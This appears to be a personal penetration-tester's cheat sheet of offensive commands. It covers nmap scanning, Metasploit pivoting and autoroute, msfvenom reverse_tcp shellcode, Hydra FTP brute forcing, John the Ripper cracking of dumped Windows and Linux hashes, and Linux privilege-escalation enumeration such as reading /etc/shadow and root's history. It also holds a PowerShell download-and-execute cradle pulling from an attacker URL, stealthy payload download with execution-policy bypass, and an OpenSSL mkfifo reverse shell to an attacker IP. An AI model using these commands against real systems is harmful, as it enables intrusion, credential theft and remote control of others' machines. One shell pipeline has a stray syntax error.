
# vpn connection

sudo openvpn


---------------------------------


# Terminator keybinds 

- move around by word
ctrl + fn + left or right arrow

- delete whole word 
alt + backspace

- split horizontally 
ctrl + super + c

- split vertically
ctrl + super + v

- close terminal
shift + ctrl + w

- restore default zoom
ctrl + 0

- fullscreen a specific pane 
ctrl + shift + Z


---------------------------------


# Nmap 

- update scripts database
nmap --script-updatedb


- ping sweep, we can run this first to discover hosts
nmap -sn 


- also we can try running no ping to see any extra hosts hidden behind firewalls
nmap -n -sn


- Once we have hosts we can scan targets to check OS and service/version and run
default scripts
nmap -T4 -O -sV -sC


- if all ports are filtered on a host be sure to check for openings on udp port
161/ (SNMP)
nmap -sU -p 161,162 


- this is for NFS enumeration on Linux if rpc services are found
nmap --script nfs-ls,nfs-showmount,nfs-statfs <targetIP>

- Linux SMB enumeration
nmap --script smb-enum-shares <targetIP>

- this checks for outbound connectivity on a linux machine
nmap -sT -p 4444-4450 portquiz.net



---------------------------------


# add/view routes and network connections

route print  (Windows)

route -v   (Linux)

ip route add <targetIP> via <gateway>

arp   (show the ARP cache)

netstat


- this tells metasploit to route all traffic intended for network (1.1.1.0/24) 
through session 2 (our meterpreter session) just run this command from msfconsole
route add 1.1.1.0/24 255.255.255.0 2


- or we can run a script directly from a meterpreter session that does the sam
thing as the command above this one
run autoroute -s 1.1.1.0/24


- this scan runs from an exploited machine to avoid IDS and firewalls, to
discover other hosts of an internal network. Run in meterpreter
run arp_scanner -r 10.10.10.0/24 

---------------------------------


# Netcat commands

- setup listener
nc -lvnp <port>

- file transfer recieving end
nc -l -p 1234 > output.file

- sending end
nc -w 3 [target] 1234 < output.file



---------------------------------


# grep for searching through large files

grep -i "string goes here" filename.txt



---------------------------------



# SSH tunneling

- -L initiates a tunnel
ssh -L localport:target:remoteport Name@sshserver.com



---------------------------------


# smbclient

smbclient \\\\targetmachine\\some-share -U username



---------------------------------


# MSF Venom/BufferOverflow

- create starting payload for BOF -l specifes length/size
msf-pattern_create -l <payloadsize>


- get offset
msf-pattern_offset -l <length> -q <EIP>


- BOF shellcode // -b "\x00" specifies to remove all null bytes, any other bad
bytes can be specified also
msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f py -b "\x00"



---------------------------------


# Hydra FTP brute forcing

hydra -t 20  -l /home/kali/Desktop/userslist -P /home/kali/Desktop/password.txt -vV <targetIP> ftp


---------------------------------


# John The Ripper 


- this one for windows passwords
john --wordlist=/home/kali/Desktop/rockyou.txt --format=NT /home/kali/Desktop/hashdump.txt

- this one for linux passwords, first unshadow them, then run John

unshadow [passwdfile] [shadowfile] > [output file name]

john --wordlist=/usr/share/john/password.lst [output file name]


---------------------------------


enum4linux 


enum4linux.pl -a <targetIP> | tee enum4linux.log



---------------------------------


# PowerShell

- in memory download cradle. if using cmd prompt, use single quotes instead
This downloads and executes a remotely hosted PS script

PS C:\> iex (New-Object Net.WebClient).DownloadString("http://attacker_url/script.ps1")


- DownloadFile method. Do not use this if trying to remain stealthy. The local var is where the file
will be saved to

PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $payload = "http://attacker_url/payload.exe"
PS C:\> $local_file = "C:\programdata\payload.exe"
PS C:\> $downloader.DownloadFile($payload,$local_file)


- If trying to remain stealthy, also make sure to use the execution policy
bypass and window hidden options

C:\> powershell.exe -ExecutionPolicy Bypass -Window Hidden .\downloader.ps1


- there is a powershell port-scanner script if needed in the offensive
powershell folder



---------------------------------



# Meterpreter 

search -d /pathtobeginsearch -f *.extension

- the -l opens a listener port on our local machine, and forwards the connection to 
the target IP on the -p port specified 

portfwd add -l <LPORT> -p <porttoconnectto> -r <targetIP>


---------------------------------


# Metasploit 

- use the socks4a module for pivoting with proxychains

- we can use this and set the session to an active meterpreter session to scan the
network from a victim machine if needed

use post/multi/gather/ping_sweep


- helpful post-exploit enum scripts here

run post/windows/gather/


- use this module to set up the pivoting environment if not using proxychains, the
mapping the network video explains this if help is needed

use post/windows/manage/autoroute

---------------------------------


# Helpful notes/tips

Pivoting is covered in the networksecurity/postexploitation/networkmap_and_pivot
folder


---------------------------------



# Proxychains

- To configure proxychains, let us open the proxychain.conf file (you can find it
in /etc), and change the last line. First run this command: 

# sudo vim /etc/proxychains.conf

[proxylist] 
# add proxy here
# meanwhile
# defaults set to "tor"
socks4 127.0.0.1 1080 (the port that is set in metaslpoits socks4a module goes
here) 


proxychains nmap <options> <targetIP> 

- if there are other services we can also use these to connect to them
proxychains ssh <targetIP>
proxychains telnet <targetIP>

- this opens a web browser with proxychains
proxychains4 iceweasel

---------------------------------



# Windows shell commands


- To check the DNS servers 
ipconfig /displaydns


- To check open connections 
netstat -ano




---------------------------------

# Linux Shell commands 

- use LinEnum or LinuxPrivChecker for linux info gathering/privesc, if not availabe we have all these
commands at our disposal 


- shows ip and NIC's 
ifconfig -a


- Prints routes on the current machine/network
route -n


- shows hops to a certain address from our current machine
traceroute -n <targetIP>


- 
cat /etc/resolv.conf


- Shows the arp tables to discover other possible hosts/communications
arp -en


- 
netstat -auntp


- alternative to netstat
ss -twurp


- Current User Information: 
id 


- kernel Version: 
uname -a


- Current User Information from /etc/passwd
grep $USER /etc/passwd


- Most Recent Logins
lastlog


- Who is currently logged onto the system
w


- Last Logged On Users
last


- All Users Including UID and GID Information 
for user in $(cat /etc/passwd | cut -f1 -d":"); do id $user; done


- List all UID 0 (root) accounts
cat /etc/passwd |cut -f1,3,4 -d":"); |grep "0:0" |cut -f1 -d":" |awk '{print $1}' 


- Read passwd File
cat /etc/passwd


- Check readability of the shadow file
cat /etc/shadow


- What can we sudo without a password? 
sudo -l


- Can we read the /etc/sudoers file? 
cat /etc/sudoers


- Can we read the roots .bash_history file? 
cat /root/.bash_history


- Can we read any other users' .bash_history files? 
find /home/* -name *.*history* -print 2> /dev/null


- Operating System
cat /etc/issue
cat /etc/*-release


- Can we sudo known binaries that allow breaking out into a shell? 
sudo -l |grep vim
sudo -l |grep nmap
sudo -l |grep vi


- Can we list root's home directory? 
ls -als /root/


- Current $PATH environment variable
echo $PATH


- List all cron jobs
cat /etc/crontab && ls -als /etc/cron*


- Find world-writeable cron jobs
find /etc/cron* -type f -perm -o+w -exec ls -l {} \;


- List running processes
ps auxwww


- List all processes running as root
ps -u root


- List all processes running as current user
ps -u $USER


- Find SUID files
find / -perm -4000 -type f 2>/dev/null


- Find SUID files owned by root
find / -uid 0 -perm -4000 -type f 2>/dev/null


- Find GUID files
find / -perm -2000 -type -f 2>/dev/null


- Find world-writeable files
find -perm -2 -type f 2>/dev/null


- List all conf files in /etc/
ls -al /etc/*.conf


- Find conf files that contain the string "pass*" 
grep pass* /etc/*.conf


- List open files
lsof -n


- List installed packages (Debian)
dpkg -l


- Common software versions 
sudo -V
httpd -v
apache2 -v
mysql -V
sendmail -d0.1


- Print process binaries/paths and permissions
ps aux | awk '{print $11}' |xargs -r ls -la 2>/dev/null |awk '!x[$0]++'



---------------------------------

# OpenSSL (linux use)

- Generate an SSL cert key/pair on attacker machine
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

- start the listener on our attacker machine and specify the .pem files we created
openssl s_server -quiet -key key.pem -cert cert.pem -port 443

- Create mkfifo named pipe as a filed called "x" in /tmp in conjunction with an openssl s_client -quiet -connect command that will connect back to our attacker machine 
mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 \ | openssl s_client -quiet -connect <attackerIP>:443 > /tmp/x; rm /tmp/x

